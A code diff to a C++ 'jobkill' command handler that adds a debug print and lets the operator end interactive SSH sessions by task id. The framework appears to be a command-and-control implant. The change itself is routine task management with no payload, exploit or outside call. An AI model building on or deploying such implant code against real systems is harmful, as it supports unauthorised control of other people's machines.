@@ -4,6 +4,9 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#ifdef INCLUDE_CMD_SSH
+#include <ssh_client.h>
+#endif
 
 #ifdef INCLUDE_CMD_JOBKILL
 
@@ -23,6 +26,9 @@ auto declfn starburst::cmd_jobkill(
             symbol<char*>( const_cast<char*>( "missing task id" ) ) );
         return;
     }
+
+    DBG_PRINT( inst, "jobkill: target='%.*s' len=%u jobs=%u\n",
+        target_len, target_uuid, target_len, inst.jobs.count );
 
     for ( uint32_t i = 0; i < inst.jobs.count; i++ ) {
         auto& job = inst.jobs.entries[i];
@@ -44,6 +50,25 @@ auto declfn starburst::cmd_jobkill(
             return;
         }
     }
+
+#ifdef INCLUDE_CMD_SSH
+    for ( uint32_t i = 0; i < inst.MAX_INTERACTIVE_SESSIONS; i++ ) {
+        auto& session = inst.interactive_sessions[i];
+        if ( !session.active ) continue;
+
+        if ( str_ncmp( session.task_uuid, target_uuid, target_len ) == 0 ) {
+            ssh_disconnect( inst, session.ssh_session_idx );
+            session.active = false;
+
+            queue_response( inst, task_uuid, RESPONSE_SUCCESS,
+                symbol<char*>( const_cast<char*>( "interactive session killed" ) ) );
+
+            queue_response( inst, session.task_uuid, RESPONSE_SUCCESS,
+                symbol<char*>( const_cast<char*>( "session terminated by operator" ) ) );
+            return;
+        }
+    }
+#endif
 
     queue_response( inst, task_uuid, RESPONSE_ERROR,
         symbol<char*>( const_cast<char*>( "job not found" ) ) );
